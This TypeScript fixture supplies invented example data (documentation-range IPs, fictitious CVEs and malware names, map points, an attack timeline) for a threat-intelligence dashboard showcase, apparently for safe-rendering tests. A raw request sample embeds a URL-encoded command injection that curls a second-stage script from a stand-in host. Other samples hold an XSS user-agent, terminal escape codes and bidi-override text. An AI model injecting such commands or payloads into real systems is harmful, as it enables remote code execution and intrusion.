/**
 * EXAMPLE DATA for the /design showcase and tests. Not real telemetry.
 * IPs are RFC 5737 documentation ranges, CVE ids are CVE-2099-EXAMPLEn,
 * technologies, malware names and countries are invented.
 */

import type { HeatmapTechnique } from "../components/AttackHeatmap";
import type { MapArc, MapHit, MapHotspot, MapSensor } from "../components/AttackMap";
import type { TimelineEvent } from "../components/AttemptTimeline";
import type { EvidenceEntry } from "../components/ConfidenceMeter";
import type { ExploitRow } from "../components/ExploitTable";
import type { IocRow } from "../components/IocTable";
import type { KpiCardProps } from "../components/KpiCard";
import type { RankedBarRow } from "../components/RankedBarTable";
import type { TrendRow } from "../components/TrendTable";

/** Deterministic pseudo-random series so server and client render the same markup. */
export function exampleSeries(seed: number, length = 24, rising = true): number[] {
  let x = (seed * 977) % 2147483647 || 1;
  const next = () => {
    x = (x * 16807) % 2147483647;
    return x / 2147483647;
  };
  const out: number[] = [];
  let v = 50;
  for (let i = 0; i < length; i++) {
    v += (next() - 0.45) * 30 + (rising ? 1.5 : 0);
    v = Math.max(5, Math.min(100, v));
    out.push(Math.round(v));
  }
  return out;
}

export const kpis: KpiCardProps[] = [
  {
    label: "Exploit attempts",
    value: "48,317",
    icon: "bolt",
    accent: true,
    change: { direction: "up", pct: 17 },
    series: exampleSeries(3),
  },
  {
    label: "Unique sources",
    value: "6,419",
    icon: "globe",
    change: { direction: "up", pct: 9 },
    series: exampleSeries(5),
  },
  {
    label: "CVEs assessed",
    value: "142",
    icon: "bug",
    change: { direction: "up", pct: 28 },
    series: exampleSeries(7),
  },
  {
    label: "Active sandboxes",
    value: "16",
    icon: "layers",
    note: "14 warm",
    series: exampleSeries(9, 24, false),
  },
];

export const navCounts = { "live-attacks": 37, "cve-intelligence": 9 } as const;

export const hotspots: MapHotspot[] = [
  {
    id: "src-na-east",
    label: "Source cluster, North America east (example)",
    lon: -77,
    lat: 38.9,
    weight: 1,
  },
  {
    id: "src-eu-west",
    label: "Source cluster, Europe west (example)",
    lon: 2.3,
    lat: 48.9,
    weight: 0.8,
  },
  {
    id: "src-asia-east",
    label: "Source cluster, Asia east (example)",
    lon: 116.4,
    lat: 39.9,
    weight: 1,
  },
  {
    id: "src-eu-east",
    label: "Source cluster, Europe east (example)",
    lon: 37.6,
    lat: 55.8,
    weight: 0.7,
  },
  {
    id: "src-sa-east",
    label: "Source cluster, South America east (example)",
    lon: -46.6,
    lat: -23.5,
    weight: 0.5,
  },
  {
    id: "src-sea",
    label: "Source cluster, South-East Asia (example)",
    lon: 103.8,
    lat: 1.35,
    weight: 0.6,
  },
  {
    id: "src-asia-south",
    label: "Source cluster, South Asia (example)",
    lon: 77.2,
    lat: 28.6,
    weight: 0.5,
  },
];

export const sensors: MapSensor[] = [
  { id: "syd-edge-03", label: "SYD-EDGE-03", lon: 151.2, lat: -33.9, hits: 88, callout: true },
  { id: "mel-edge-01", label: "MEL-EDGE-01", lon: 144.96, lat: -37.8, hits: 41 },
  { id: "bne-edge-02", label: "BNE-EDGE-02", lon: 153, lat: -27.5, hits: 23 },
  { id: "per-edge-01", label: "PER-EDGE-01", lon: 115.9, lat: -32, hits: 17 },
  { id: "cbr-res-01", label: "CBR-RES-01", lon: 149.1, lat: -35.3, hits: 12 },
  { id: "drw-edge-01", label: "DRW-EDGE-01", lon: 130.8, lat: -12.5, hits: 6 },
];

export const arcs: MapArc[] = hotspots.map((h) => ({ from: h.id, to: "syd-edge-03" }));

const HIT_CENTRES: [number, number][] = [
  [-74, 40.7],
  [-87.6, 41.9],
  [-118.2, 34],
  [-122.4, 37.8],
  [-46.6, -23.5],
  [-0.1, 51.5],
  [2.3, 48.9],
  [13.4, 52.5],
  [37.6, 55.8],
  [116.4, 39.9],
  [121.5, 31.2],
  [139.7, 35.7],
  [126.9, 37.5],
  [77.2, 28.6],
  [103.8, 1.35],
  [106.8, -6.2],
  [151.2, -33.9],
  [144.96, -37.8],
];

export const hits: MapHit[] = (() => {
  let x = 42;
  const next = () => {
    x = (x * 16807) % 2147483647;
    return x / 2147483647;
  };
  const out: MapHit[] = [];
  HIT_CENTRES.forEach(([lon, lat], c) => {
    for (let k = 0; k < 10; k++) {
      out.push({
        id: `hit-${c}-${k}`,
        lon: lon + (next() - 0.5) * 12,
        lat: lat + (next() - 0.5) * 8,
        intensity: Math.round((0.45 + next() * 0.5) * 100) / 100,
      });
    }
  });
  return out;
})();

export const attackerIps: RankedBarRow[] = [
  { key: "a", label: "198.51.100.42", tag: "XX", value: 96 },
  { key: "b", label: "203.0.113.77", tag: "XX", value: 84 },
  { key: "c", label: "192.0.2.15", tag: "XX", value: 71 },
  { key: "d", label: "198.51.100.9", tag: "XX", value: 58 },
  { key: "e", label: "203.0.113.201", tag: "XX", value: 51 },
  { key: "f", label: "192.0.2.140", tag: "XX", value: 44 },
  { key: "g", label: "198.51.100.188", tag: "XX", value: 37 },
  { key: "h", label: "203.0.113.17", tag: "XX", value: 31 },
];

export const technologies: RankedBarRow[] = [
  { key: "vpn", label: "ExampleVPN", tag: "E", value: 28 },
  { key: "ssh", label: "Example Linux SSH", tag: "E", value: 16 },
  { key: "hv", label: "ExampleHypervisor", tag: "E", value: 12 },
  { key: "fw", label: "ExampleFirewall", tag: "E", value: 9 },
  { key: "gw", label: "ExampleGateway", tag: "E", value: 8 },
  { key: "cms", label: "Example CMS", tag: "E", value: 7 },
  { key: "plc", label: "ExamplePLC (ICS)", tag: "E", value: 6 },
  { key: "other", label: "Other", tag: "O", value: 14 },
];

export const countries: TrendRow[] = [
  { key: "a", label: "Country A", badge: "EX", value: 8812, series: exampleSeries(31, 16, false) },
  { key: "b", label: "Country B", badge: "EX", value: 7104, series: exampleSeries(32, 16, false) },
  { key: "c", label: "Country C", badge: "EX", value: 5441, series: exampleSeries(33, 16, false) },
  { key: "d", label: "Country D", badge: "EX", value: 3992, series: exampleSeries(34, 16, false) },
  { key: "e", label: "Country E", badge: "EX", value: 3221, series: exampleSeries(35, 16, false) },
  { key: "f", label: "Country F", badge: "EX", value: 2114, series: exampleSeries(36, 16, false) },
];

export const recentExploits: ExploitRow[] = [
  {
    key: "1",
    ago: "1m 23s",
    cve: "CVE-2099-EXAMPLE1",
    technology: "ExampleVPN 9.2 auth bypass",
    confidence: { level: "assessed", score: 64 },
  },
  {
    key: "2",
    ago: "15m 34s",
    cve: "CVE-2099-EXAMPLE3",
    technology: "ExampleKV 8.6 RESTORE",
    confidence: { level: "probable", score: 81 },
  },
  {
    key: "3",
    ago: "22m 49s",
    cve: "CVE-2099-EXAMPLE2",
    technology: "ExampleGW 14.1 RCE",
    confidence: { level: "confirmed", score: 96 },
  },
  {
    key: "4",
    ago: "31m 05s",
    cve: "CVE-2099-EXAMPLE4",
    technology: "ExamplePLC S7 write",
    confidence: { level: "assessed", score: 58 },
  },
  {
    key: "5",
    ago: "44m 12s",
    cve: "CVE-2099-EXAMPLE5",
    technology: "Example CMS 4.1 upload",
    confidence: { level: "probable", score: 77 },
  },
  {
    key: "6",
    ago: "52m 40s",
    cve: "CVE-2099-EXAMPLE6",
    technology: "ExampleMail 15 SSRF",
    confidence: { level: "confirmed", score: 92 },
  },
  {
    key: "7",
    ago: "1h 03m",
    cve: "CVE-2099-EXAMPLE7",
    technology: "ExampleHypervisor 8 heap",
    confidence: { level: "assessed", score: 49 },
  },
  {
    key: "8",
    ago: "1h 18m",
    cve: "CVE-2099-EXAMPLE8",
    technology: "ExampleFirewall 7.2 path",
    confidence: { level: "confirmed", score: 98 },
  },
  {
    key: "9",
    ago: "1h 31m",
    cve: "CVE-2099-EXAMPLE9",
    technology: "ExampleSSH 9.6 pre-auth",
    confidence: { level: "assessed", score: 41 },
  },
  {
    key: "10",
    ago: "1h 47m",
    cve: "CVE-2099-EXAMPLE10",
    technology: "ExampleCI 2.4 deserialise",
    confidence: { level: "probable", score: 73 },
  },
];

export const malware: TrendRow[] = [
  {
    key: "mirai",
    label: "Example-Mirai-variant",
    badge: "M",
    value: 12443,
    change: { direction: "up", pct: 32 },
    series: exampleSeries(41, 24, false),
  },
  {
    key: "xmr",
    label: "Example-XMR-miner",
    badge: "X",
    value: 8992,
    change: { direction: "up", pct: 14 },
    series: exampleSeries(42, 24, false),
  },
  {
    key: "beacon",
    label: "Example-Beacon",
    badge: "B",
    value: 6221,
    change: { direction: "up", pct: 27 },
    series: exampleSeries(43, 24, false),
  },
  {
    key: "webshell",
    label: "Example-Webshell",
    badge: "W",
    value: 4881,
    change: { direction: "up", pct: 19 },
    series: exampleSeries(44, 24, false),
  },
  {
    key: "rat",
    label: "Example-RAT",
    badge: "R",
    value: 4210,
    change: { direction: "up", pct: 11 },
    series: exampleSeries(45, 24, false),
  },
  {
    key: "dropper",
    label: "Example-Dropper.sh",
    badge: "D",
    value: 3842,
    change: { direction: "down", pct: 8 },
    series: exampleSeries(46, 24, false),
  },
  {
    key: "memimplant",
    label: "Example-MemImplant",
    badge: "M",
    value: 2998,
    change: { direction: "up", pct: 15 },
    series: exampleSeries(47, 24, false),
  },
  {
    key: "stealer",
    label: "Example-Stealer",
    badge: "S",
    value: 2443,
    change: { direction: "up", pct: 18 },
    series: exampleSeries(48, 24, false),
  },
  {
    key: "botnet",
    label: "Example-Botnet-B",
    badge: "B",
    value: 1906,
    change: { direction: "up", pct: 6 },
    series: exampleSeries(49, 24, false),
  },
  {
    key: "loader",
    label: "Example-Loader",
    badge: "L",
    value: 1377,
    change: { direction: "down", pct: 3 },
    series: exampleSeries(50, 24, false),
  },
];

export const evidence: EvidenceEntry[] = [
  {
    id: "e1",
    at: "+0.000s",
    signal: "Request matched the vulnerable path for CVE-2099-EXAMPLE1",
    source: "vulnerable-path hook",
    points: 30,
  },
  {
    id: "e2",
    at: "+0.412s",
    signal: "Body shape matches the public proof of concept",
    source: "payload match",
    points: 22,
  },
  {
    id: "e3",
    at: "+0.418s",
    signal: "Decoy version is in the affected range",
    source: "catalogue entry",
    points: 12,
  },
  {
    id: "e4",
    at: "+1.020s",
    signal: "No post-exploit command observed",
    source: "sandbox capture",
    points: -6,
  },
  {
    id: "e5",
    at: "+1.020s",
    signal: "Source also scanned unrelated ports",
    source: "attempt history",
    points: 6,
  },
];

export const heatmapColumns = ["00-04", "04-08", "08-12", "12-16", "16-20", "20-24"] as const;

export const heatmap: HeatmapTechnique[] = [
  { id: "T1190", name: "Exploit Public-Facing Application", counts: [42, 38, 51, 64, 58, 47] },
  { id: "T1110", name: "Brute Force", counts: [88, 91, 73, 69, 80, 95] },
  { id: "T1059", name: "Command and Scripting Interpreter", counts: [12, 9, 15, 21, 18, 11] },
  { id: "T1105", name: "Ingress Tool Transfer", counts: [7, 4, 9, 13, 10, 6] },
  { id: "T1505.003", name: "Web Shell", counts: [0, 2, 3, 1, 4, 0] },
  { id: "T1496", name: "Resource Hijacking", counts: [5, 3, 0, 6, 8, 2] },
];

export const timeline: TimelineEvent[] = [
  {
    id: "t1",
    offset: "+0.000s",
    kind: "connect",
    summary: "TCP connect from 198.51.100.42 to ExampleVPN decoy on 443.",
  },
  {
    id: "t2",
    offset: "+0.214s",
    kind: "request",
    summary: "POST /example/auth with an oversized session field.",
  },
  {
    id: "t3",
    offset: "+0.412s",
    kind: "hook",
    technique: "T1190",
    summary: "Vulnerable-path hook fired in the auth handler.",
    cve: { id: "CVE-2099-EXAMPLE1", confidence: { level: "assessed", score: 64 } },
  },
  {
    id: "t4",
    offset: "+0.980s",
    kind: "payload",
    technique: "T1105",
    summary: "Shell attempted to fetch a second stage from 203.0.113.77.",
  },
  {
    id: "t5",
    offset: "+0.981s",
    kind: "blocked",
    summary: "Egress denied by sandbox policy. Fetch logged, nothing left the sandbox.",
  },
  {
    id: "t6",
    offset: "+42.0s",
    kind: "reset",
    summary: "Sandbox rotated from the catalogue digest.",
  },
];

export const iocs: IocRow[] = [
  {
    key: "i1",
    type: "ipv4",
    value: "198.51.100.42",
    firstSeen: "2099-01-01 03:12",
    lastSeen: "2099-01-01 09:40",
    count: 96,
    confidence: { level: "confirmed", score: 94 },
  },
  {
    key: "i2",
    type: "ipv4",
    value: "203.0.113.77",
    firstSeen: "2099-01-01 04:01",
    lastSeen: "2099-01-01 09:02",
    count: 84,
    confidence: { level: "probable", score: 79 },
  },
  {
    key: "i3",
    type: "url",
    value: "http://203.0.113.77/example/stage2.sh",
    firstSeen: "2099-01-01 04:01",
    lastSeen: "2099-01-01 04:01",
    count: 3,
    confidence: { level: "assessed", score: 61 },
  },
  {
    key: "i4",
    type: "sha256",
    value: "0000000000000000000000000000000000000000000000000000000000example",
    firstSeen: "2099-01-01 04:01",
    lastSeen: "2099-01-01 04:01",
    count: 1,
  },
  {
    key: "i5",
    type: "user-agent",
    value: "<script>alert(1)</script> ExampleScanner/1.0",
    firstSeen: "2099-01-01 05:30",
    lastSeen: "2099-01-01 08:12",
    count: 12,
    confidence: { level: "assessed", score: 40 },
  },
];

export const rawRequest = [
  "POST /example/auth HTTP/1.1",
  "Host: 192.0.2.10",
  "User-Agent: <script>alert(1)</script> ExampleScanner/1.0",
  "Content-Type: application/x-www-form-urlencoded",
  "X-Example: \u001b[31mterminal escape\u001b[0m and ‮reversed‬ text",
  "",
  `session=${"A".repeat(2400)}&next=%2Fexample%3Bcurl%20http%3A%2F%2F203.0.113.77%2Fexample%2Fstage2.sh`,
].join("\n");
